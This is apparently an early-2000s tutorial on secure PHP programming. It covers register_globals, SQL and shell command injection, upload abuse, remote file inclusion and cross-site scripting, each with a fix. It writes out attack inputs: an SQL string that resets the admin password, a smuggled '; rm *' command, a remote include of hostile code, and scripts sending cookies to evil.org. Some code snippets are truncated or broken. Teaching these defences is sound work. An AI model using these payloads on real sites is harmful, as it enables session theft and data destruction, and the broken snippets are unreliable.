    Writing code that prevents some common types of attacks is
    rather easy&mdash;here are some guidelines.
    </p></div></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x1d5b580.0x1e53500"></a></h2></div></div><p>From time to time, you will find a
security advisory about some major web application on security
mailing lists. Most of the time, the problem is fixed easily. The
errors often occur because the author had five minutes to do his
application while his boss was yelling at him, or was distracted
when developing it or simply did not have enough practice in
programming secure web applications.
</p><p>Writing a secure web application is not an easy task, because
the real problem is not a matter of knowledge but one of practice.
It is a good idea to keep some tips in mind when programming. To
help memorize them, you should understand how and why they are so
important. Then you can start to change your programming practices
in the future. Knowledge of the most common threats and respective
modes of attack can go a long way toward increasing
security.</p><p>This article provides a basis for understanding secure
programming with PHP and gives a broader view of the subject. You
should keep in mind that these guidelines identify only the most
common threats and how to avoid them, reducing the risk of security
compromise at the same time.</p><p>The basic rule for writing a secure application is:
<span   class="emphasis"><em>never trust user input</em></span>. Poorly validated user
input constitutes the most severe security vulnerabilities in any
web application. In other words, input data should be considered
guilty unless proven innocent.</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x1d5b580.0x1e53768"></a>Global Variable Scope</h2></div></div><p>PHP versions prior to 4.2.0 registered by default all kinds
of external variables in the global scope. So no variable could be
trusted, whether external or internal.</p><p>Look at the following example:</p><pre     class="programlisting">
&lt;?php
    if (authenticate_user()) {
        $authenticated = true;
    }
    ...

    if (!$authenticated) {
        die("Authorization required");
    }
?&gt;
</pre><p>If you set $authenticated to 1 via GET, like this:
<pre     class="programlisting">
http://example.com/admin.php?authenticated=1
</pre>


you would pass the last &ldquo;if&rdquo; in the previous example.
</p><p>Thankfully, since version 4.1.0, PHP has deprecated
register_globals. This means that GET, POST, Cookie, Server,
Environment and Session variables are no longer in the global scope
anymore. To help users build PHP applications with register_globals
off, several new special arrays exist that are automatically global
in any scope. They include $_GET, $_POST, $COOKIE, $_SERVER, $_ENV,
$_REQUEST and $_SESSION.</p><p>If the directive register_globals is on, do yourself a favor
and turn it off. If you turn it off and then validate all the user
input, you made a big step toward secure programming. In many
cases, a type casting is sufficient validation.</p><p>Client-side JavaScript form checks do not make any
difference, because an attacker can submit any request, not only
one that is available on the form. Here is an example of what this
would look like:</p><pre     class="programlisting">
&lt;?php
    $_SESSION['authenticated'] = false;
    if (authenticate_user()) {
        $_SESSION['authenticated'] = true;
    }
    ...
    if (!$_SESSION['authenticated']) {
        die("Authorization required");
    }
?&gt;
</pre></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x1d5b580.0x1e53b30"></a>Database Interactions</h2></div></div><p>Most PHP applications use databases, and they use input from
a web form to construct SQL query strings. This type of interaction
can be a security problem.</p><p>Imagine a PHP script that edits data from some table, with a
web form that POSTs to the same script. The beginning of the script
checks to see if the form was submitted, and if so, it updates the
table the user chose.</p><pre     class="programlisting">
&lt;?php
    if ($update_table_submit) {
        $db-&gt;query("update $table set name=$name");
    }
?&gt;
</pre><p>If you do not validate the variable $table that came from the
web form, and if you do not check to see if the
$update_table_submit variable came from the form (via
<b  >$POST['update_table_submit']</b>), you can set its
value via GET to whatever you want. You could do it like this:
<pre     class="programlisting">
http://example.com/edit.php?update_table_submit
=1&amp;table=users+set+password%3Daaa
+where+user%3D%27admin%27+%23
</pre>


which results in the following SQL query:
<pre     class="programlisting">
update users set password=aaa
  where user="admin" # set name=$name
</pre>


A simple validation for the $table variable would be to check
whether its content is alphabetical only, or if it is only one word
(<b  >if (count(explode("",$table)) { ... }</b>).
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x1d5b580.0x1e53ea0"></a>Calling External Programs</h2></div></div><p>Sometimes we need to call external programs (using system(),
exec(), popen(), passthru() or the back-tick operator) in our PHP
scripts. One of the most dangerous security threats is calling
external programs if the program name or its arguments are based on
user input. In fact, the PHP manual page for most of these
functions includes a note that warns: &ldquo;If you are going to allow
data coming from user input to be passed to this function, then you
should be using escapeshellarg() or escapeshellcmd() to make sure
that users cannot trick the system into executing arbitrary
commands.&rdquo;</p><p>Imagine the following example:</p><pre     class="programlisting">
&lt;?php
    $fp = popen('/usr/sbin/sendmail -i '. $to, 'w');
?&gt;
</pre><p>The user can control the content of the variable $to above in
the following manner:
<pre     class="programlisting">
http://example.com/send.php?$to=evil%40evil.org+
%3C+%2Fetc%2Fpasswd%3B+rm+%2A
</pre>


The result of this input would be running this command:
<pre     class="programlisting">
/usr/sbin/sendmail -i evil@evil.org
/etc/passwd; rm *
</pre>


A simple solution to resolve this security problem is:
<pre     class="programlisting">
&lt;?php
    $fp = popen('/usr/sbin/sendmail -i '.
                escapeshellarg($to), 'w');
?&gt;
</pre>


Better than that, check whether the content in the $to variable is
a valid e-mail address, with a <b  >regexp</b>.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x1d5b580.0x1e54210"></a>File Upload</h2></div></div><p>User-uploaded files also can be problematic because of the
way PHP handles them. PHP will define a variable in the global
scope that has the same name as the file input tag in the submitted
web form. Then, it will create this file with the uploaded file
content, but it will not check whether the filename is valid or is
the uploaded file.</p><pre     class="programlisting">
&lt;?php
    if ($upload_file &amp;&amp; $fn_type == 'image/gif' &amp;&amp;
            $fn_size &lt; 100000) {
        copy($fn, 'images/');
        unlink($fn);
    }
?&gt;
&lt;form method="post" name="fileupload"
 action="fupload.php" enctype="multipart/form-data"&gt;
File: &lt;input type="file" name="fn"&gt;
&lt;input type="submit" name="upload_file"
 value="Upload"&gt;
</pre><p>A malicious user could create his own form specifying the
name of some other file that contains sensitive information and
submit it, resulting in the processing of that other file. For
example,
<pre     class="programlisting">
&lt;form method="post" name="fileupload"
 action="fupload.php"&gt;
&lt;input type="hidden" name="fn"
 value="/var/www/html/index.php"&gt;
&lt;input type="hidden" name="fn_type"
value="text"&gt;
&lt;input type="hidden" name="fn_size"
value="22"&gt;
&lt;input type="submit" name="upload_file"
 value="Upload"&gt;
</pre>


The above input would result in moving the file
/var/www/html/index.php to images/.
</p><p>A solution for this problem is to use move_uploaded_file() or
is_uploaded_file(). However, there are some other problems with
user-uploaded files. Imagine that you have a web application that
lets users upload images smaller than 100Kb. In this case, even
using move_uploaded_file() or is_uploaded_file() would not solve
the problem. The attacker still could submit his form specifying
the file size, as in the prior example. The solution here is to use
the super-global array $_FILES to check user uploaded file
information:</p><pre     class="programlisting">
&lt;?php
    if ($upload_file &amp;&amp;
        $_FILES['fn']['type'] ==
'image/gif
        $_FILES['fn']['size'] &lt; 100000) {
            move_uploaded_file(
                $_FILES['fn']['tmp_name'],
                'images/');
    }
?&gt;
</pre></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x1d5b580.0x1e544d0"></a>Include Files</h2></div></div><p>In PHP you can include local or remote files by using
include(), include_once(), require() and require_once(). This is a
good feature, because it allows you to have separate files for
classes, reused code and so on, increasing the maintainability and
readability of your code.</p><p>The concept of including remote files is dangerous in itself,
though, because the remote site could be compromised or the network
connection could be spoofed. In either scenario, you are injecting
unknown and possibly hostile code directly into your script.</p><p>Including files presents some other problems, especially if
you include files whose filename or path is based on user input.
Imagine a script that includes several HTML files and displays them
in the proper layout:</p><pre     class="programlisting">
&lt;?php
include($layout);
?&gt;
</pre><p>If someone were to pass the $layout variable through GET, you
probably can figure out what the consequences might be:
<pre     class="programlisting">
http://example.com/leftframe.php?layout=/etc/passwd
</pre>


or
<pre     class="programlisting">
http://example.com/leftframe.php?layout=
http://evil.org/nasty.html
</pre>


where nasty.html contains a couple lines of code, such as:
<pre     class="programlisting">
&lt;?php
    passthru('rm *');
    passthru('mail
?&gt;
</pre>


To avoid this possibility, you should validate the variable you use
in include(), perhaps with a <b  >regexp</b>.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x1d5b580.0x1e54898"></a>Cross-Site Scripting</h2></div></div><p>Cross-site scripting (CSS) has been receiving a great deal of
press attention. A simple search in the BugTraq mail archives
retrieved 15 different reports from June 2002 alone, about
cross-site scripting vulnerabilities in several
applications.</p><p>This kind of attack works directly against the users of your
site. It does this by tricking the victim into making a specific
and carefully crafted HTTP request. This can happen through a link
in an HTML e-mail message, in a web-based forum or embedded in a
malicious web page. The victim may not know he is making such a
request, if the link is embedded into a malicious web page for
example, and the attack may not even require user facilitation.
That is, when the user's browser receives the page requested, the
malicious script is parsed and executed in the security context of
the user.</p><p>Modern client-side scripting languages also can execute a
number of functions that can be dangerous. Although, for example,
JavaScript allows only the originating site to access its own
private cookies, the attacker can bypass such a restriction by
taking advantage of poorly coded scripts.</p><p>The common scenario for CSS attacks is when a user is logged
in to a web application and has a valid session stored in a session
cookie. The attacker constructs a link to the application from an
area of the application that doesn't check user input for validity.
It essentially processes what the victim requests and returns
it.</p><p>Here is an example of such a scenario to illustrate my point.
Imagine a web-mail application that blindly prints the mail subject
in a mailbox list, like this:</p><pre     class="programlisting">
&lt;?php
    ...
    echo "&lt;TD&gt; $subject &lt;/TD&gt;";
?&gt;
</pre><p>In this case, an attacker could include JavaScript code in an
e-mail subject, and it would be executed in the user's browser when
he opens the mailbox.
</p><p>This vulnerability then can be used to steal a user's cookies
and allow the attacker to take over the user's session, by
including JavaScript code like this:</p><pre     class="programlisting">
&lt;script&gt;
self.location.href=
"http://evil.org/cookie-grab.html?cookies="
+escape(document.cookie)
&lt;/script&gt;
</pre><p>When the user opens the mailbox, he will be redirected to the
URL specified in the JavaScript code, which includes the victim's
cookie. The attacker then simply needs to check his web server logs
to know the victim's session cookie.
</p><p>A vulnerability could be fixed by using htmlspecialchars()
when printing variables. htmlspecialchars() converts special
characters to HTML entities, meaning it will convert the &lt; and
&gt; characters from the &lt;script&gt; tag to their respective
entities, &amp;lt and &amp;gt. When the victim's browser parses the
page, it will not do anything dangerous because
&amp;lt;script&amp;gr; means simple text to the browser.</p><p>So, a possible solution for this type of attack is:</p><pre     class="programlisting">
&lt;?php
    ...
    echo "&lt;TD&gt; ".htmlspecialchars($subject)."
&lt;/TD&gt;";
?&gt;
</pre><p>Another common scenario involves printing variables blindly
to a hidden input section of a web form:
<pre     class="programlisting">
&lt;input type="hidden" name="page"
 value="&lt;?php echo $page; ?&gt;"&gt;
</pre>


Consider the following URL:
<pre     class="programlisting">
http://example.com/page.php?page="&gt;
&lt;script&gt;self.location.href="http://evil.org/
css-attack.html?cookies="
+escape(document.cookie)&lt;/script&gt;
</pre>


If the attacker can get us to select a link such as this one, it is
possible that our browser will be redirected to the attacker's
site, as in the previous example. But because the variable $page is
integer, you could cast it or use the PHP function intval() to
avoid this problem:
<pre     class="programlisting">
&lt;input type="hidden" name="page"
 value="&lt;?php echo intval($page); ?&gt;"&gt;
</pre>


Again, to avoid this kind of attack you always should perform user
validation or insure that user-submitted data always is
HTML-escaped before displaying it.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x1d5b580.0x224d170"></a>Conclusions</h2></div></div><p>I hope these guidelines help you have more secure web
applications. The big lessons here are never trust user input,
never trust variables that are passed between scripts (as through
GET), never trust variables that came from a web form and never
trust a variable if is not initialized in your script. If you
cannot initialize a variable in your script, be sure to validate
it.</p></div></div>
